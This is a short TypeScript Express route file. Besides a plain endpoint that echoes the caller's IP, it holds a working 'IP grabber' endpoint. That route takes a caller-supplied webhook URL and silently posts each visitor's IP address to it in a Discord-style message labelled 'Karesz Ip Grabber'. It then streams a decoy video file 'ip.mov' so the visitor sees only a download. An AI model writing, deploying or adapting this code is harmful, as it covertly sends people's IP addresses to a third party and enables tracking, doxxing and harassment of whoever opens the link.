import express from "express";
import { ApiError } from ".";
import fetch from "node-fetch";

export const init = (app: express.Application) => {
    //* GET /ip
    app.get("/ip", (req, res) => {
        res.send(req.ip);
    });

    //* GET /grabip
    app.get("/grabip", async (req, res, next) => {
        const webhook = req.body.webhook || req.query.webhook;

        if (!webhook) return next(new ApiError(90101));

        const ip = req.ip;
        const body = JSON.stringify({
            embeds: [
                {
                    description: ip,
                    timestamp: new Date().toISOString(),
                },
            ],
            username: "Karesz Ip Grabber",
            avatar_url: "https://i.imgur.com/Q1DM7Lu.png",
        });
        const whRequest = await fetch(webhook, {
            method: "POST",
            headers: {
                "content-type": "application/json",
            },
            body,
        });
        // const whData = await whRequest.json();
        // console.log(whData);

        res.setHeader("content-disposition", "attachment; filename=ip.mov");

        (await fetch("http://cdn.karesz.xyz/ip.mov")).body.pipe(res);
    });
};
